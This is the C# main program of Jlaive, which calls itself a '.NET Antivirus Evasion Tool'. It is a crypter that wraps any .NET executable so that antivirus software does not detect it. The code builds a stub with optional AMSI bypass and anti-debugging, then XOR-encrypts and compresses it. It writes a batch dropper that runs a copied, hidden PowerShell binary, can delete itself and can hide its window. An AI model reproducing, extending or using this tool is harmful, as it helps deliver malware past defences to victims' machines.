using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.CSharp;

using static Jlaive.Utils;

namespace Jlaive
{
    internal class Program
    {
        static string _output = string.Empty;
        static string _input = string.Empty;
        static bool _amsibypass = false;
        static bool _antidebug = false;
        static bool _obfuscate = false;
        static bool _deleteself = false;
        static bool _hidden = false;

        static void Main(string[] args)
        {
            if (args.Length < 1) HelpManual();
            else if (args[0] == "help" || args[0] == "--help" || args[0] == "-h") HelpManual();

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-o" || args[i] == "--output") _output = args[i + 1];
                else if (args[i] == "-i" || args[i] == "--input") _input = args[i + 1];
                else if (args[i] == "-ab" || args[i] == "--amsibypass") _amsibypass = true;
                else if (args[i] == "-ad" || args[i] == "--antidebug") _antidebug = true;
                else if (args[i] == "-obf" || args[i] == "--obfuscate") _obfuscate = true;
                else if (args[i] == "-d" || args[i] == "--deleteself") _deleteself = true;
                else if (args[i] == "-h" || args[i] == "--hidden") _hidden = true;
            }

            if (!File.Exists(_output))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid output path.");
                Console.ResetColor();
                Environment.Exit(1);
            }
            if (!File.Exists(_input))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid input path.");
                Console.ResetColor();
                Environment.Exit(1);
            }
            if (!IsAssembly(_input))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Input file not valid assembly!");
                Console.ResetColor();
                Environment.Exit(1);
            }

            Random rng = new Random();
            Console.ForegroundColor = ConsoleColor.Gray;
            byte[] pbytes = File.ReadAllBytes(_input);

            Console.WriteLine("Creating .NET stub...");
            string stub = StubGen.CreateCS(pbytes, _amsibypass, _antidebug, rng);

            string tempfile = Path.GetTempFileName();
            Console.WriteLine("Compiling stub...");
            CSharpCodeProvider csc = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
            {
                GenerateExecutable = true,
                CompilerOptions = "/optimize",
                IncludeDebugInformation = false
            };
            CompilerResults results = csc.CompileAssemblyFromSource(parameters, stub);
            if (results.Errors.Count > 0)
            {
                List<string> errors = new List<string>();
                foreach (CompilerError error in results.Errors) errors.Add(error.ToString());
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Stub build errors:{Environment.NewLine}{string.Join(Environment.NewLine, errors)}");
                Console.ResetColor();
                Environment.Exit(1);
                return;
            }
            byte[] stubbytes = File.ReadAllBytes(tempfile);
            File.Delete(tempfile);

            Console.WriteLine("Encrypting stub...");
            string key = RandomString(20, rng);
            byte[] encrypted = XORCrypt(Compress(stubbytes), key);

            Console.WriteLine("Creating PowerShell command...");
            string command = StubGen.CreatePS(key, _hidden, rng);

            Console.WriteLine("Constructing batch file...");
            StringBuilder toobf = new StringBuilder();
            toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
            toobf.AppendLine("attrib +s +h pshell.exe");
            toobf.AppendLine("cls");
            toobf.AppendLine(command);
            toobf.AppendLine("attrib -s -h pshell.exe");
            toobf.Append("del pshell.exe");
            StringBuilder output = new StringBuilder();
            output.AppendLine("@echo off");
            if (_obfuscate) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
            else output.AppendLine(toobf.ToString());
            if (_deleteself) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
            output.AppendLine("exit");
            output.Append(Convert.ToBase64String(encrypted));

            Console.WriteLine("Writing output...");
            _output = Path.ChangeExtension(_output, "bat");
            File.WriteAllText(_output, output.ToString(), Encoding.ASCII);

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"Build successful!\nOutput path: {_output}");
            Console.ResetColor();
            Environment.Exit(0);
        }

        static void HelpManual()
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@".________ .___    .______  .___ .___     ._______
:____.   \|   |   :      \ : __||   |___ : .____/
 __|  :/ ||   |   |   .   || : ||   |   || : _/\ 
|     :  ||   |/\ |   :   ||   ||   :   ||   /  \
 \__. __/ |   /  \|___|   ||   | \      ||_.: __/
    :/    |______/    |___||___|  \____/    :/   
    :                                            ");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(".NET Antivirus Evasion Tool");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("GitHub: https://github.com/ch2sh/Jlaive");
            Console.WriteLine("Discord: https://discord.gg/RU5RjSe8WN");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Usage:");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write($" {Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)} [-h|--help] [-i|--input] [-o|--output] [-ab|--amsibypass] [-ad|--antidebug] [-obf|--obfuscate] [-d|--deleteself] [-h|--hidden]\n\n");

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Arguments:");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("--help          Print help information");
            Console.WriteLine("--input         Set file input path");
            Console.WriteLine("--output        Set file output path");
            Console.WriteLine("--amsibypass    Bypass Assembly.Load AMSI check");
            Console.WriteLine("--antidebug     Add anti debug protection to output file.");
            Console.WriteLine("--obfuscate     Obfuscate output file");
            Console.WriteLine("--deleteself    Make output file delete itself after execution");
            Console.WriteLine("--hidden        Hide console during execution");
            Console.WriteLine();
            Console.ResetColor();
            Environment.Exit(0);
        }
    }
}
